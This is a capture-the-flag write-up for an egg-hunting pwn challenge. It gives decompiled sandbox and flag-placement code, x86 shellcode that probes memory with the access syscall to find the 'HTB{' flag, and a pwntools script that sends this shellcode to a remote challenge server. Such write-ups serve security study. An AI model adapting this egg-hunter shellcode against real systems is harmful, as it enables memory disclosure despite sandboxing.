- This is an #egghunting challenge, where the binary sandboxes itself, stores the flag in a random area of memory (bounded) and then executes user-provided shellcode
- The solution is to utilize the `access` syscall to probe for mapped memory addresses
	- If our `access` call probes if a specific address is mapped and it isn't, then it returns an `EFAULT` code
```am
_start:
    push 0xFF               # set duration for arg1 of alarm()
    pop ebx
    push 0x1B               # alarm(0xFF)
    pop eax
    int 0x80
    mov edi, 0x7b425448     # egg p32("HTB{")
    mov edx, 0x5FFFFFFF     # set start address to search for the egg
page_front:
    or dx, 0xfff            # page sizes in x86 linux are of size 4096
address_front:
    inc edx                 # edx = 4096
    pusha                   # push all of the current general purposes registers onto the stack
    xor ecx, ecx            # clear arg2
    lea ebx, [edx + 0x4]    # address to be validated for memory violation
    mov al, 0x21            # access syscall
    int 0x80
    cmp al, 0xf2            # EFAULT (0xf2)?
    popa                    # get all the registers back
    jz page_front           # jump to next page if EFAULT
    cmp [edx], edi          # compare string to egg
    jnz address_front       # jump to next address if NOT egg

    mov ecx, edx            # now the second argument of write points to the egg
    push 0x24               # set the length of write to 36 (as it is shown on our decompilation)
    pop edx
    push 0x1                # set the fd of write to stdout
    pop ebx
    mov al, 0x4             # perform write syscall
    int 0x80                # do it!
```

### challenge.c
```d
int32_t sandbox()
    int16_t var_14 = 0xe
    void* var_10 = &data_4060
    
    if (prctl(option: 0x26, 1, 0, 0, 0) s< 0)
        perror(s: "prctl(PR_SET_NO_NEW_PRIVS)")
        exit(status: 2)
        noreturn
    
    int32_t result = prctl(option: 0x16, 2, &var_14)
    
    if (result s>= 0)
        return result
    
    perror(s: "prctl(PR_SET_SECCOMP)")
    exit(status: 2)
    noreturn
```
- locks down the binary with `seccomp`, prevents all juicy syscalls like `mmap` and `execve` or even `prctl`

```d
int32_t randomInit()
    int32_t fd = open(file: "/dev/urandom", oflag: 0)
    char buf[0x8]
    read(fd, &buf, nbytes: 8)
    close(fd)
    buf[4]
    srand(x: buf[0].d)
    int32_t i = 0
    
    while (i s<= 0x5fffffff || i u> 0xf7000000)
        i = rand() << 0x10
    
    return i
```
- Picks a random value between `0x5fffffff` and `0xf7000000` to later pass to `mmap` in order to store the flag

```d
int32_t main(int32_t argc, char** argv, char** envp)
    void* const __return_addr_1 = __return_addr
    int32_t* var_10 = &argc
    int32_t randAddr = randomInit()
    signal(sig: 0xe, handler: exit)
    alarm(10)
    char* mmapAddr = mmap(addr: randAddr, len: _init, prot: 3, flags: 0x31, fd: 0xffffffff, offset: 0)
    
    if (mmapAddr == 0xffffffff)
        exit(status: 0xffffffff)
        noreturn
    
    strcpy(mmapAddr, "HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXX…")
    memset("HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXX…", 0, 0x25)
    int32_t var_18_1 = 0
    sandbox()
    int32_t buf = mmap(addr: nullptr, len: _init, prot: 7, flags: 0x21, fd: 0xffffffff, offset: 0)
    read(fd: 0, buf, nbytes: 0x3c)
    int32_t var_14_1 = 0
    buf()
    return 0
```

### solve.py
```python
#!/usr/bin/env python3

from pwn import *

exe = "./hunting"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

context.log_level = "debug"
io = remote("83.136.253.5", 40944)

shellcode = asm("""
_start:
    push 0xFF               # set duration for arg1 of alarm()
    pop ebx
    push 0x1B               # alarm(0xFF)
    pop eax
    int 0x80
    mov edi, 0x7b425448     # egg p32("HTB{")
    mov edx, 0x5FFFFFFF     # set start address to search for the egg
page_front:
    or dx, 0xfff            # page sizes in x86 linux are of size 4096
address_front:
    inc edx                 # edx = 4096
    pusha                   # push all of the current general purposes registers onto the stack
    xor ecx, ecx            # clear arg2
    lea ebx, [edx + 0x4]    # address to be validated for memory violation
    mov al, 0x21            # access syscall
    int 0x80
    cmp al, 0xf2            # EFAULT (0xf2)?
    popa                    # get all the registers back
    jz page_front           # jump to next page if EFAULT
    cmp [edx], edi          # compare string to egg
    jnz address_front       # jump to next address if NOT egg

    mov ecx, edx            # now the second argument of write points to the egg
    push 0x24               # set the length of write to 36 (as it is shown on our decompilation)
    pop edx
    push 0x1                # set the fd of write to stdout
    pop ebx
    mov al, 0x4             # perform write syscall
    int 0x80                # do it!
""")

io.clean()
io.send(shellcode)
io.interactive()
```
